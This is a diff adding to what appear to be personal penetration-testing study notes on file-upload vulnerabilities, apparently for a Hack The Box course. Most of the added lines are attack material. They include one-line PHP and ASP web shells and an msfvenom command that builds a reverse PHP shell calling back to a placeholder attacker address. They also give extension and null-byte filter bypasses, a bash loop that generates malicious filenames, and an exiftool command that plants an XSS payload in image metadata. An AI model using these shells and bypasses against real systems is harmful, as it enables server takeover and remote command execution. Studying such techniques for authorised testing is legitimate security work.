@@ -57,4 +57,68 @@ https://github.com/fuzzdb-project/fuzzdb (important)
 
 https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+https://github.com/pentestmonkey/php-reverse-shell
+https://github.com/Arrexel/phpbash
+https://github.com/pentestmonkey/php-reverse-shell
+https://github.com/danielmiessler/SecLists/blob/master/Web-Shells/WordPress/plugin-shell.php
+
+
+php
+<?php system($_REQUEST['cmd']); ?>
+
+asp
+<% eval request('cmd') %>
+
+msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
+
+Client-Side Validation
+function search in console = validate,upload
+<input type="file" name="uploadFile" id="uploadFile" onchange="checkFile(this)" accept=".jpg,.jpeg,.png">
+
+wordlist for extensions
+https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt
+
+Double Extensions
+shell.jpg.php
+
+Reverse Double Extension
+shell.php.jpg
+shell.php.jpg?cmd=id
+
+Character Injection
+%20
+%0a
+%00
+%0d0a
+/
+.\
+.
+…
+:
+
+example, (shell.php%00.jpg)
+bash code
+for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '…' ':'; do
+    for ext in '.php' '.phps'; do
+        echo "shell$char$ext.jpg" >> wordlist.txt
+        echo "shell$ext$char.jpg" >> wordlist.txt
+        echo "shell.jpg$char$ext" >> wordlist.txt
+        echo "shell.jpg$ext$char" >> wordlist.txt
+    done
+done
+
+
+Type Filters
+wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Discovery/Web-Content/web-all-content-types.txt
+cat web-all-content-types.txt | grep 'image/' > image-content-types.txt
+
+File Signature or Magic Bytes
+https://en.wikipedia.org/wiki/List_of_file_signatures
+https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime
+
+
+exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
 
